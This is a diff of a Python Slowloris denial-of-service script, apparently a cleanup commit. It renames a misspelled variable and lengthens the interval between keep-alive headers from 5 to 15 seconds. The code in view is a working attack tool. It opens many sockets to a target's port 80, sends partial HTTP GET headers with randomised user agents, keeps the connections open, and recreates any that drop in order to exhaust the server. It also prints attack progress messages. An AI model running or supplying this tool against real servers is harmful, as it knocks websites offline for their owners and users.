@@ -31,31 +31,31 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
-def build_socket(destionation_IP):
+def build_socket(destination_ip):
     """Generate a socket, connect and send partial message to destination IP address.
     
     Arguments:
-    destionation_IP -- the IP address of the target
+    destination_ip -- the IP address of the target
 
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
-    s.connect((destionation_IP, 80))
+    s.connect((destination_ip, 80))
     s.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 2000)).encode("utf-8"))
     s.send("User-Agent: {}\r\n".format(choice(user_agents)).encode("utf-8"))
     s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     
     return s
 
-def start_slowloris(destionation_IP, socket_count):
+def start_slowloris(destination_ip, socket_count):
     """Send partial HTTP GET requests without closing the connection"""
-    print("Attacking " + str(destionation_IP) + " with " +  str(socket_count) + " sockets.")
+    print("Attacking " + str(destination_ip) + " with " +  str(socket_count) + " sockets.")
     print("Creating sockets...")
     
     for i in range(socket_count):
         try:
             print("Creating socket nr: " + str(i))
-            s = build_socket(destionation_IP)
+            s = build_socket(destination_ip)
         except socket.error:
             break
         list_of_sockets.append(s)
@@ -72,12 +72,12 @@ def start_slowloris(destionation_IP, socket_count):
             for i in range(socket_count - len(list_of_sockets)):
                 print("Recreating socket...")
                 try:
-                    s = build_socket(destionation_IP)
+                    s = build_socket(destination_ip)
                     if s:
                         list_of_sockets.append(s)
                 except socket.error:
                     break
-            sleep(5) # timeout in sending headers, every 10 sec
+            sleep(15) # timeout in sending headers, every 15 sec
         except (KeyboardInterrupt, SystemExit):
             print("\nStopping Slowloris...")
             break
